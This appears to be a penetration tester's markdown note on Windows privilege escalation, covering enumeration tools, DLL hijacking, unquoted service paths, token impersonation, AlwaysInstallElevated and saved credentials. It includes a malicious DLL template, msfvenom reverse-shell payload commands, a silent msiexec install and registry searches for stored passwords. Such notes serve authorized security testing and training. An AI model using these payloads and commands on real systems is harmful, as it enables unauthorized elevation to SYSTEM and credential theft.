---
tags:
  - "#type/tech-specific"
  - "#attack/privilege-escalation"
---
# Fundamentals

For windows privilege levels see [[2 Tech-Specifics/OS/Windows/Windows fundamentals|Windows fundamentals]]

# Pentesting

## Workflow

1. enumerate current user and its privileges
2. if possible use enumeration script (winPEAS or PowerUp.ps1)
3. go by checklist

## Enumeration for Privilege Escalation

### Tool-Based Enumeration

See:

- [[3 Tools/privilige escalation/winPEAS|winPEAS]]
- [[3 Tools/privilige escalation/PowerUp|PowerUp]]
- [[3 Tools/windows/Windows Exploit Suggester - Next Generation (WESNG)|Windows Exploit Suggester - Next Generation (WESNG)]]
- if you have a [[3 Tools/exploitation frameworks/Metasploit/meterpreter|meterpreter]] shell:
	- use `multi/recon/local_exploit_suggester`
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [BeRoot](https://github.com/AlessandroZ/BeRoot)

### Manual Enumeration

Ressources:

- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- <https://github.com/sagishahar/lpeworkshop>

Cheat Sheets:

- [[2 Tech-Specifics/OS/Windows/Enumeration/cmd Enumeration Cheat Sheet|cmd Enumeration Cheat Sheet]]
- [[2 Tech-Specifics/OS/Windows/Enumeration/PowerShell Enumeration Cheat Sheet|PowerShell Enumeration Cheat Sheet]]

## Privilege Escalation Vectors

### DLL Hijacking

#### DLL search order

If **SafeDllSearchMode** is enabled:

1. directory from which the application loaded.
2. The system directory. Use the [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) to get the path of this directory.
3. The 16-bit system directory.
4. The Windows directory. [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) to get the path
5. The current directory.
6. PATH directories. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

if **SafeDllSearchMode** is disabled:

1. dir where application is loaded
2. current directory
3. system directory
4. 16-bit system directory
5. windows directory
6. PATH directories

for DLL hijack insert malicous DLL in higher position than the legitimate is in

vulnerabilities can only be discorvered with admin privs -> you need a test system

malicious DLL template:

``` 
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)

{

if (dwReason == DLL_PROCESS_ATTACH) {
system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
ExitProcess(0);
}
return TRUE;

}
``` 

compile with mingw: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

`sc stop dllsvc & sc start dllsvc`

### Unquoted Service Path

requirements:

1. Being able to write to a folder on the path
2. Being able to restart the service

if the path of a service is not provided as absolute path written in quotes, windows will start searching for the binary to run: it will search in every directory contained by the path, starting at the lowest one

-> put malicious .exe file in a directory where windows finds it before the legitimate one

1. find service with unquoted path
`wmic service get name,displayname,pathname,startmode`: to list services, search for unquoted path
2. check privs on path folders: eg. `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`
3. generate payload, eg with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[port] -f exe > [executable_name].exe`
4. start/restart service `sc start [service name]`

### Token Impersonation

services make requests to higher priviliged service accounts -> man in the middle attack to get a security token to athenticate on the service account

**eg. Hot Potato (alread patched):**

Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.

Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.

Step 3: The target system will ask for a proxy configuration file (wpad.dat).

Step 4: A malicious wpad.dat file is sent to the target.

Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).

Step 6: The exploit will ask the target system to perform an NTLM authentication.

Step 7: The target system sends an NTLM handshake.

Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be "NT AUTHORITY\SYSTEM".

### Scheduled Tasks

same method as with cronjobs on linux

`schtasks`: query scheduled tasks

eg. `schtasks /query /fo LIST /v`

### Driver

are not updated very often, exploits may be available online

`driverquery`: list installed drivers

### AlwaysInstallElevated

if windows installer files (.msi) always run with elevated privileges, we can create a malicious .msi file and run it on the target system

prerequisites: the following registry options have to be set:

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

1. generate payload, eg using [[3 Tools/exploitation frameworks/Metasploit/msfvenom]]: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi`
2. transfer payload to target
3. start installer: `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

### Saved Credentials

list credentials that are saved on the system: `cmdkey /list`

try saved credentials: `runas /savecred /user:admin reverse_shell.exe`

query registry keys possibly containing passwords: `reg query HKLM /f password /t REG_SZ /s` or `reg query HKCU /f password /t REG_SZ /s`

### Local Service Connections

some services may have network connections to localhost. since they are not cnnected to the outside, they often have weak security configs.

any port that is listening, and not detectable from an outside scan may be vulnerable

`netstat -ano`: list active internal network connection

	`-a`: all active connections and listening ports

	`-n`: no name resolution

	`-o`: show corresponding process id

### Installed Software

check installed software and search for exploits

# Hardening
